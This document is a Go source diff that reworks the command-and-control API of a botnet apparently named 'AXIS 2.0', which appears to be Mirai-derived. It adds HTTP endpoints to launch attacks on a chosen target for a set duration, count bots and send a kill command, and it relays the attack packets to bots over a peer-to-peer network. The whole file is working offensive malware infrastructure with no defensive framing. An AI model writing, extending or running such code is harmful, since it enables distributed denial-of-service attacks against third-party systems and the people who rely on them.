@@ -1,111 +1,202 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"net"
-	"strconv"
+	"net/http"
 	"strings"
 	"time"
 )
 
-type Api struct {
-	conn net.Conn
+/*
+ * AXIS 2.0 REST API
+ * Endpoints:
+ *   POST /api/attack - Launch attack
+ *   GET  /api/status   - Get network status
+ *   GET  /api/bots     - Get bot count (P2P peers)
+ *   POST /api/kill     - Stop all attacks
+ */
+
+type APIRequest struct {
+	Method   string `json:"method"`
+	Target   string `json:"target"`
+	Duration int    `json:"duration"`
+	APIKey   string `json:"api_key"`
 }
 
-func NewApi(conn net.Conn) *Api {
-	return &Api{conn}
+type APIResponse struct {
+	Success bool   `json:"success"`
+	Message string `json:"message"`
+	Data    interface{} `json:"data,omitempty"`
 }
 
-func (this *Api) Handle() {
-	var botCount int
-	var apiKeyValid bool
-	var userInfo AccountInfo
+type APIServer struct {
+	listenAddr string
+}
 
-	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-	this.conn.Write([]byte("AXIS 2.0 API Server - Enter API Key|command\r\n"))
-	cmd, err := this.ReadLine()
+func NewAPIServer(addr string) *APIServer {
+	return &APIServer{listenAddr: addr}
+}
+
+func (this *APIServer) Start() {
+	http.HandleFunc("/api/attack", this.handleAttack)
+	http.HandleFunc("/api/status", this.handleStatus)
+	http.HandleFunc("/api/bots", this.handleBots)
+	http.HandleFunc("/api/kill", this.handleKill)
+
+	fmt.Printf("API Server listening on %s\n", this.listenAddr)
+	http.ListenAndServe(this.listenAddr, nil)
+}
+
+func (this *APIServer) handleAttack(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != "POST" {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Method not allowed"})
+		return
+	}
+
+	var req APIRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid JSON"})
+		return
+	}
+
+	/* Validate API key */
+	if !database.ValidateAPIKey(req.APIKey) {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid API key"})
+		return
+	}
+
+	/* Validate method */
+	attackInfo, ok := attackInfoLookup[req.Method]
+	if !ok {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Invalid attack method"})
+		return
+	}
+
+	/* Build attack */
+	atk, err := NewAttack(fmt.Sprintf("%s %s %d", req.Method, req.Target, req.Duration), true)
 	if err != nil {
-		this.conn.Write([]byte("ERR|Failed reading line\r\n"))
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
 		return
 	}
 
-	passwordSplit := strings.SplitN(cmd, "|", 2)
-	if len(passwordSplit) < 2 {
-		this.conn.Write([]byte("ERR|Invalid format. Use: APIKEY|command\r\n"))
-		return
-	}
-
-	if apiKeyValid, userInfo = database.CheckApiCode(passwordSplit[0]); !apiKeyValid {
-		this.conn.Write([]byte("ERR|API code invalid\r\n"))
-		return
-	}
-
-	cmd = passwordSplit[1]
-
-	if cmd == "amountbots" {
-		botCount = clientList.Count()
-		m := clientList.Distribution()
-		for k, v := range m {
-			this.conn.Write([]byte(fmt.Sprintf("%s: %d\r\n", k, v)))
-		}
-		this.conn.Write([]byte(fmt.Sprintf("Total bot count: %d\r\n", botCount)))
-		return
-	}
-
-	if cmd[0] == '-' {
-		countSplit := strings.SplitN(cmd, " ", 2)
-		count := countSplit[0][1:]
-		botCount, err = strconv.Atoi(count)
-		if err != nil {
-			this.conn.Write([]byte("ERR|Failed parsing botcount\r\n"))
-			return
-		}
-		if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
-			this.conn.Write([]byte("ERR|Specified bot count over limit\r\n"))
-			return
-		}
-		cmd = countSplit[1]
-	} else {
-		botCount = userInfo.maxBots
-	}
-
-	atk, err := NewAttack(cmd, userInfo.admin)
-	if err != nil {
-		this.conn.Write([]byte("ERR|Failed parsing attack command\r\n"))
-		return
-	}
 	buf, err := atk.Build()
 	if err != nil {
-		this.conn.Write([]byte("ERR|An unknown error occurred\r\n"))
-		return
-	}
-	if database.ContainsWhitelistedTargets(atk) {
-		this.conn.Write([]byte("ERR|Attack targeting whitelisted target\r\n"))
-		return
-	}
-	if can, _ := database.CanLaunchAttack(userInfo.username, atk.Duration, cmd, botCount, 1); !can {
-		this.conn.Write([]byte("ERR|Attack cannot be launched\r\n"))
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
 		return
 	}
 
-	clientList.QueueBuf(buf, botCount, "")
-	this.conn.Write([]byte("OK|Attack launched\r\n"))
+	/* Send via P2P network */
+	p2pSeeds := getAutoP2PSeeds()
+	injector := NewP2PInjector(p2pSeeds)
+	if err := injector.SendAttack(buf); err != nil {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: err.Error()})
+		return
+	}
+
+	json.NewEncoder(w).Encode(APIResponse{
+		Success: true,
+		Message: "Attack launched successfully",
+		Data: map[string]interface{}{
+			"method":   req.Method,
+			"target":   req.Target,
+			"duration": req.Duration,
+		},
+	})
 }
 
-func (this *Api) ReadLine() (string, error) {
-	buf := make([]byte, 1024)
-	bufPos := 0
+func (this *APIServer) handleStatus(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
 
-	for {
-		n, err := this.conn.Read(buf[bufPos : bufPos+1])
-		if err != nil || n != 1 {
-			return "", err
-		}
-		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
-			bufPos--
-		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
-			return string(buf[:bufPos]), nil
-		}
-		bufPos++
+	status := map[string]interface{}{
+		"status":      "online",
+		"network":     "P2P",
+		"uptime":      time.Now().Format(time.RFC3339),
+		"version":     "2.0",
+		"attack_types": len(attackInfoLookup),
 	}
+
+	json.NewEncoder(w).Encode(APIResponse{Success: true, Message: "OK", Data: status})
+}
+
+func (this *APIServer) handleBots(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	/* P2P network - estimate bot count from peer count */
+	botCount := estimateP2PPeers()
+
+	json.NewEncoder(w).Encode(APIResponse{
+		Success: true,
+		Message: "OK",
+		Data: map[string]int{
+			"bots": botCount,
+		},
+	})
+}
+
+func (this *APIServer) handleKill(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	if r.Method != "POST" {
+		json.NewEncoder(w).Encode(APIResponse{Success: false, Message: "Method not allowed"})
+		return
+	}
+
+	/* Build kill packet */
+	killPacket := []byte{0x11, 0x00}  /* P2P_CMD_KILL, TTL=0 */
+
+	p2pSeeds := getAutoP2PSeeds()
+	injector := NewP2PInjector(p2pSeeds)
+	injector.SendAttack(killPacket)
+
+	json.NewEncoder(w).Encode(APIResponse{
+		Success: true,
+		Message: "Kill command sent to P2P network",
+	})
+}
+
+/* Helper functions */
+
+func getAutoP2PSeeds() string {
+	/* Auto-discover P2P seeds from recent connections */
+	seeds := []string{}
+	
+	/* Try common local network broadcasts */
+	addrs, err := net.InterfaceAddrs()
+	if err == nil {
+		for _, addr := range addrs {
+			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+				if ipnet.IP.To4() != nil {
+					ip := ipnet.IP.To4()
+					seed := fmt.Sprintf("%d.%d.%d.%d:49152", ip[0], ip[1], ip[2], ip[3])
+					seeds = append(seeds, seed)
+				}
+			}
+		}
+	}
+
+	/* Add configured seeds if any */
+	configured := "127.0.0.1:49152"
+	if configured != "" {
+		seeds = append(seeds, strings.Split(configured, ",")...)
+	}
+
+	result := ""
+	for i, seed := range seeds {
+		if i > 0 {
+			result += ","
+		}
+		result += seed
+	}
+
+	return result
+}
+
+func estimateP2PPeers() int {
+	/* Estimate from recent P2P activity */
+	/* In production, this would track actual peer count */
+	return 0  /* P2P - exact count not available */
 }
